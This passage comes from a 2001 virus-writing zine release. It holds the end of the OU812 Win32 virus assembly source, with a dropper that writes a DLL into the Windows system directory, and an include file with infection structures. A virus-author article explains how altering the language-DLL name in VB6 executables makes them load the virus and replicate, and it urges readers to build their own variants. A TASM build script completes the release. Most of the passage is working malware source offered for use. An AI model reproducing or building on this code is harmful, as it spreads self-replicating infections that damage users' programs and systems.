;       db      X, X                    ;6a 5e dll characteristics
;       db      X, X, X, X              ;6c 60 size of stack reserve
;       db      X, X, X, X              ;70 64 size of stack commit
;       db      X, X, X, X              ;74 68 size of heap reserve
;       db      X, X, X, X              ;78 6c size of heap commit
;       db      X, X, X, X              ;7c 70 loader flags
;       dd      6                       ;80 74 number of rva and sizes
;       dd      0                       ;84 78 export
;       db      X, X, X, X              ;88 7c export
;       dd      0                       ;8c 80 import
;       dd      0                       ;90 84 import
;       dd      0                       ;94 88 resource (overload for section name)
;       dd      0                       ;98 8c resource (overload for section name)
;       dd      0                       ;9c 90 exception (overload for virtual size)
;       dd      1000h                   ;a0 94 exception (overload for relative virtual address)
;       dd      (size of code)          ;a4 98 certificate (overload for file size)
;       dd      1                       ;a8 9c certificate (overload for file offset)
;       dd      0ach, 8                 ;ac a0 base reloc (overload for pointer to relocs)
;       dd      0                       ;b4 a8 debug (overload for reloc table and line numbers)
;       dd      60000000h               ;b8 ac debug (overload for section characteristics)
;                                       ;bc

drop_dll        label   near
        mov     ebx, esp
        lea     esi, dword ptr [edi + offset dlllabel - offset drop_dll]
        mov     edi, offset ou812_codeend - offset ou812_dllcode + dllsize + 1ffh
        push    edi
        xor     ebp, ebp                        ;GMEM_FIXED
        push    ebp
        call    dword ptr [ebx + dllcrcstk.dGlobalAlloc]
        push    eax                             ;GlobalFree
        push    ebp                             ;WriteFile
        push    esp                             ;WriteFile
        push    edi                             ;WriteFile
        push    eax                             ;WriteFile
        push    ebp                             ;CreateFileA
        push    ebp                             ;CreateFileA
        push    CREATE_ALWAYS                   ;CreateFileA
        push    ebp                             ;CreateFileA
        push    ebp                             ;CreateFileA
        push    GENERIC_WRITE                   ;CreateFileA
        push    eax                             ;CreateFileA
        lea     ecx, dword ptr [eax + 7fh]
        push    ecx                             ;MoveFileA
        push    eax                             ;MoveFileA
        push    eax                             ;GetFileAttributesA
        push    ebp                             ;SetFileAttributesA
        push    eax                             ;SetFileAttributesA
        push    ecx                             ;DeleteFileA
        push    ecx                             ;GetTempFileNameA
        push    ebp                             ;GetTempFileNameA
        push    esp                             ;GetTempFileNameA
        push    eax                             ;GetTempFileNameA
        push    edi                             ;GetSystemDirectory
        push    eax                             ;GetSystemDirectory
        xchg    ebp, eax
        call    dword ptr [ebx + dllcrcstk.dGetSystemDirectoryA]
        lea     edi, dword ptr [ebp + eax - 1]
        call    dword ptr [ebx + dllcrcstk.dGetTempFileNameA]
        call    dword ptr [ebx + dllcrcstk.dDeleteFileA]
        mov     al, '\'
        scas    byte ptr [edi]
        je      skip_slash
        stos    byte ptr [edi]

;-----------------------------------------------------------------------------
;append dll name, assumes name is 0ch bytes long
;-----------------------------------------------------------------------------

skip_slash      label   near
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]

;-----------------------------------------------------------------------------
;anti-anti-file dropper - remove read-only attribute, delete file, rename directory
;-----------------------------------------------------------------------------

        call    dword ptr [ebx + dllcrcstk.dSetFileAttributesA]
        call    dword ptr [ebx + dllcrcstk.dGetFileAttributesA]
        test    al, FILE_ATTRIBUTE_DIRECTORY
        pop     ecx
        pop     eax
        je      skip_move
        push    eax
        push    ecx
        call    dword ptr [ebx + dllcrcstk.dMoveFileA]

skip_move       label   near
        call    dword ptr [ebx + dllcrcstk.dCreateFileA]
        push    ebx
        xchg    ebp, eax
        xchg    edi, eax
        call    dword ptr [ebx + dllcrcstk.dGetTickCount]
        xchg    ebx, eax
        xor     ecx, ecx

;-----------------------------------------------------------------------------
;decompress dll MZ header, PE header, section table, relocation table
;-----------------------------------------------------------------------------

        lods    dword ptr [esi]

copy_bytes      label   near
        movs    byte ptr [edi], byte ptr [esi]

test_bits       label   near
        add     eax, eax
        jb      copy_bytes
        add     eax, eax
        sbb     dl, dl
        and     dl, bl
        shld    ecx, eax, 4
        rol     ebx, cl
        shl     eax, 4
        xchg    edx, eax
        rep     stos byte ptr [edi]
        xchg    edx, eax
        jne     test_bits
        lods    dword ptr [esi]
        test    eax, eax
        jne     test_bits
        mov     cx, offset ou812_codeend - offset ou812_dllcode
        sub     esi, offset drop_dll - offset ou812_dllcode
        rep     movs byte ptr [edi], byte ptr [esi]
        pop     ebx
        push    ebp
        call    dword ptr [ebx + dllcrcstk.dWriteFile]
        push    ebp
        call    dword ptr [ebx + dllcrcstk.dCloseHandle]
        call    dword ptr [ebx + dllcrcstk.dGlobalFree]
        add     esp, size dllcrcstk
        popad
        ret
ou812_execode   endp
ou812_codeend   label   near
ou812_kernel    endp
ou812_dllcode   endp
end             dropper
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[OU812.ASM]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[OU812.INC]컴�
MAX_PATH                        equ     260

DLL_PROCESS_ATTACH              equ     1
DLL_THREAD_ATTACH               equ     2

FILE_ATTRIBUTE_DIRECTORY        equ     00000010h
FILE_ATTRIBUTE_NORMAL           equ     00000080h
FILE_FLAG_RANDOM_ACCESS         equ     10000000h

GMEM_FIXED                      equ     0000h

CREATE_ALWAYS                   equ     2
OPEN_EXISTING                   equ     3

GENERIC_WRITE                   equ     40000000h
GENERIC_READ                    equ     80000000h

IMAGE_FILE_MACHINE_I386         equ     14ch    ;14d/14e do not exist.  if you don't believe, then try it

IMAGE_FILE_RELOCS_STRIPPED      equ     0001h
IMAGE_FILE_EXECUTABLE_IMAGE     equ     0002h
IMAGE_FILE_32BIT_MACHINE        equ     0100h
IMAGE_FILE_SYSTEM               equ     1000h
IMAGE_FILE_DLL                  equ     2000h
IMAGE_FILE_UP_SYSTEM_ONLY       equ     4000h

IMAGE_SUBSYSTEM_WINDOWS_GUI     equ     2
IMAGE_SUBSYSTEM_WINDOWS_CUI     equ     3

RANDPADMIN                      equ     4096
RANDPADMAX                      equ     2048 ;RANDPADMIN is added to this

SECTION_MAP_WRITE               equ     0002h

FILE_MAP_WRITE                  equ     SECTION_MAP_WRITE

PAGE_READWRITE                  equ     04

align           1                               ;byte-packed structures
krncrcstk       struct
        kSfcIsFileProtected     dd      ?       ;appended from other location
        kUnmapViewOfFile        dd      ?
        kSetFileTime            dd      ?
        kSetFileAttributesW     dd      ?
        kSetFileAttributesA     dd      ?
        kSetCurrentDirectoryW   dd      ?
        kSetCurrentDirectoryA   dd      ?
        kMultiByteToWideChar    dd      ?
        kMapViewOfFile          dd      ?
        kLoadLibraryA           dd      ?
        kGlobalFree             dd      ?
        kGlobalAlloc            dd      ?
        kGetVersion             dd      ?
        kGetTickCount           dd      ?
        kGetFullPathNameW       dd      ?
        kGetFullPathNameA       dd      ?
        kFindNextFileW          dd      ?
        kFindNextFileA          dd      ?
        kFindFirstFileW         dd      ?
        kFindFirstFileA         dd      ?
        kFindClose              dd      ?
        kCreateFileMappingA     dd      ?
        kCreateFileW            dd      ?
        kCreateFileA            dd      ?
        kCloseHandle            dd      ?
krncrcstk       ends
krncrc_count    equ     (size krncrcstk - 4) shr 2

dllcrcstk       struct
        dWriteFile              dd      ?
        dSetFileAttributesA     dd      ?
        dMoveFileA              dd      ?
        dGlobalFree             dd      ?
        dGlobalAlloc            dd      ?
        dGetTickCount           dd      ?
        dGetTempFileNameA       dd      ?
        dGetSystemDirectoryA    dd      ?
        dGetFileAttributesA     dd      ?
        dDeleteFileA            dd      ?
        dCreateFileA            dd      ?
        dCloseHandle            dd      ?
dllcrcstk       ends
dllcrc_count    equ     size dllcrcstk shr 2

initstk         struct
        initret         dd      ?
        initDLLHandle   dd      ?
        initReason      dd      ?
        initReserved    dd      ?
initstk         ends

sehstruc        struct
        sehkrnlret      dd      ?
        sehexcptrec     dd      ?
        sehprevseh      dd      ?
sehstruc        ends

FILETIME        struct
        dwLowDateTime   dd      ?
        dwHighDateTime  dd      ?
FILETIME        ends

WIN32_FIND_DATA struct
        dwFileAttributes        dd              ?
        ftCreationTime          FILETIME        <?>
        ftLastAccessTime        FILETIME        <?>
        ftLastWriteTime         FILETIME        <?>
        dwFileSizeHigh          dd              ?
        dwFileSizeLow           dd              ?
        dwReserved0             dd              ?
        dwReserved1             dd              ?
        cFileName               dw              260 dup (?)
        cAlternateFileName      dw              14 dup (?)
WIN32_FIND_DATA ends

findlist        struct
        findprev        dd                      ?
        findhand        dd                      ?
        finddata        WIN32_FIND_DATA         <?>
findlist        ends

coffhdr         struct
        pemachine       dw      ?               ;04
        pesectcount     dw      ?               ;06
        petimedate      dd      ?               ;08
        pesymbrva       dd      ?               ;0C
        pesymbcount     dd      ?               ;10
        peopthdrsize    dw      ?               ;14
        peflags         dw      ?               ;16
coffhdr         ends

pedir           struct
        dirrva          dd      ?
        dirsize         dd      ?
pedir           ends

pehdr           struct
        pesig           dd      ?               ;00
        pecoff          coffhdr <?>
        pemagic         dw      ?               ;18
        pemajorlink     db      ?               ;1A
        peminorlink     db      ?               ;1B
        pecodesize      dd      ?               ;1C
        peidatasize     dd      ?               ;20
        peudatasize     dd      ?               ;24
        peentrypoint    dd      ?               ;28
        pecodebase      dd      ?               ;2C
        pedatabase      dd      ?               ;30
        peimagebase     dd      ?               ;34
        pesectalign     dd      ?               ;38
        pefilealign     dd      ?               ;3C
        pemajoros       dw      ?               ;40
        peminoros       dw      ?               ;42
        pemajorimage    dw      ?               ;44
        peminorimage    dw      ?               ;46
        pemajorsubsys   dw      ?               ;48
        peminorsubsys   dw      ?               ;4A
        pereserved      dd      ?               ;4C
        peimagesize     dd      ?               ;50
        pehdrsize       dd      ?               ;54
        pechksum        dd      ?               ;58
        pesubsys        dw      ?               ;5C
        pedllflags      dw      ?               ;5E
        pestackmax      dd      ?               ;60
        pestacksize     dd      ?               ;64
        peheapmax       dd      ?               ;68
        peheapsize      dd      ?               ;6C
        peldrflags      dd      ?               ;70
        pervacount      dd      ?               ;74
        peexport        pedir   <?>             ;78
        peimport        pedir   <?>             ;80
        persrc          pedir   <?>             ;88
        peexcpt         pedir   <?>             ;90
        pesecurity      pedir   <?>             ;98
        pereloc         pedir   <?>             ;A0
        pedebug         pedir   <?>             ;A8
        pearch          pedir   <?>             ;B0
        peglobal        pedir   <?>             ;B8
        petls           pedir   <?>             ;C0
        peconfig        pedir   <?>             ;C8
        pebound         pedir   <?>             ;D0
        peiat           pedir   <?>             ;D8
        pedelay         pedir   <?>             ;E0
        pecom           pedir   <?>             ;E8
        persrv          pedir   <?>             ;F0
pehdr           ends

peexp           struct
        expflags        dd      ?
        expdatetime     dd      ?
        expmajorver     dw      ?
        expminorver     dw      ?
        expdllrva       dd      ?
        expordbase      dd      ?
        expadrcount     dd      ?
        expnamecount    dd      ?
        expadrrva       dd      ?
        expnamerva      dd      ?
        expordrva       dd      ?
peexp           ends

mzhdr           struct
        mzsig           dw      ?               ;00
        mzpagemod       dw      ?               ;02
        mzpagediv       dw      ?               ;04
        mzrelocs        dw      ?               ;06
        mzhdrsize       dw      ?               ;08
        mzminalloc      dw      ?               ;0A
        mzmaxalloc      dw      ?               ;0C
        mzss            dw      ?               ;0E
        mzsp            dw      ?               ;10
        mzchksum        dw      ?               ;12
        mzip            dw      ?               ;14
        mzcs            dw      ?               ;16
        mzreloff        dw      ?               ;18
        mzfiller        db      22h dup (?)     ;1A
        mzlfanew        dd      ?               ;3C
mzhdr           ends

pesect          struct
        sectname        db      8 dup (?)
        sectvirtsize    dd      ?
        sectvirtaddr    dd      ?
        sectrawsize     dd      ?
        sectrawaddr     dd      ?
        sectreladdr     dd      ?
        sectlineaddr    dd      ?
        sectrelcount    dw      ?
        sectlinecount   dw      ?
        sectflags       dd      ?
pesect          ends

mapsehstk       struct
        mapsehprev      dd      ?
        mapsehexcpt     dd      ?
        mapsehregs      dd      8 dup (?)
        mapsehsehret    dd      ?
        mapsehinfret    dd      ?
mapsehstk       ends

mapstack        struct
        mapfilesize     dd      ?
        mapmapret       dd      ?
        mapinfret       dd      ?
        mapattrib       dd      ?
mapstack        ends

infectstk       struct
        infsect         dd              ?
        infmapview      dd              ?
        inffilesize     dd              ?
        infseh          mapsehstk       <?>
infectstk       ends
align                                           ;restore default alignment
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[OU812.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[VB6.TXT]컴�
                            VB6 Speaks My Language
                              roy g biv / defjam

                                 -= defjam =-
                                  since 1992
                     bringing you the viruses of tomorrow
                                    today!


Prologue:

Please excuse my English.  I'm still learning.


About the author:

Former  DOS/Win16  virus writer, author of several virus  families,  including
Ginger  (see Coderz #1 zine for terrible buggy example, contact me for  better
sources  ;),  and  Virus Bulletin 9/95 for a description of what  they  called
Rainbow.   Co-author  of  world's first virus using circular  partition  trick
(Orsam,  coded  with  Prototype in 1993).  Designer of the world's  first  XMS
swapping  virus (John Galt, coded by RTFishel in 1995, only 30 bytes stub, the
rest  is  swapped  out).   Author of world's first virus  using  Thread  Local
Storage  for  replication (Shrug).  Author of various retrovirus articles  (eg
see Vlad #7 for the strings that make your code invisible to TBScan).  Went to
sleep for a number of years.  This is my second virus for Win32.

I'm also available for joining a group.  Just in case anyone is interested. ;)


What is it?

VB6 applications support different languages by containing the filename of the
dll that contains  the language strings.  By changing the name of this dll, we
can make VB6 automatically run our code.


How does it work?

I got the idea for this while I was researching the smallest Win32 PE exe that
can be created.  During that time, I received in e-mail a foreign language VB6
file  (maybe  sent by a virus).  This file wanted to load a dll that I do  not
have.  When I saw later another VB6 file that did execute, I could see what to
change.  The  code works by altering the entry point to the dll dropper  code.
After  this, it runs the host.  When VB6 loads the dll, then the dll code will
replicate.   The original entry point points to table that begins with  'VB5!'
string.   At offset 6 from there is name of first dll.  Usually, this is  '*'.
At  offset  20 is name of second dll.  Usually, this is '~'.  If  the  default
names  are changed to filenames, then they will be used.  If first dll  cannot
be loaded then second dll will be loaded.  If second dll cannot be loaded then
file  will  not execute.  Therefore, if we change the first name to  something
not  existing (like 0) and change the second name to our file, then is created
a system dependency where file requires that our dll exists. :)

About the small exe research:
Minimum sections for exe in 9x: 0
                            Me: 0
                            NT: 1
                            2k: 1
                            XP: 1
Requires relocations?       No, unless loaded to invalid address
NT/2000/XP  require  import section that imports dll that uses kernel32  APIs,
else a page fault occurs.  This appears to be a bug.
Minimum sections for dll in 9x: 0
                            Me: 0
                            NT: 0
                            2k: 1
                            XP: 1
Requires relocations?       Yes, always for all platforms, but can be empty
Also, in 9x/Me section header must end outside PE header (but can begin inside
it)  because  9x/Me assumes section header ends after PE header, and will  not
read enough bytes (eg missing reloc directory) if section header ends first.


Epilogue:

Now  you  want to look at my example code and then to make your own  examples.
There   are  many  possibilities  with  this  technique  that  make  it   very
interesting.  It is easy when you know how.  Just use your imagination.


Greets to the old Defjam crew:

Prototype, RTFishel, Obleak, and The Gingerbread Man


rgb/dj jun 2001
iam_rgb@hotmail.com
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[VB6.TXT]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKE.BAT]컴�
@echo off
if %1.==. goto usage
%tasm32%\bin\tasm32 /r /ml /m9 /os /p /q /w2 /zn %1
if errorlevel 1 goto end
%tasm32%\bin\tlink32 /c /B:400000 /Tpe /aa /x /n %1.obj,,,%tasm32%\lib\import32.lib,
del %1.obj
goto end

:usage
echo.
echo Usage: MAKE filename
echo eg. MAKE OU812
echo requires %tasm32% set to TASM directory (eg C:\TASM)

:end
echo.
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKE.BAT]컴�
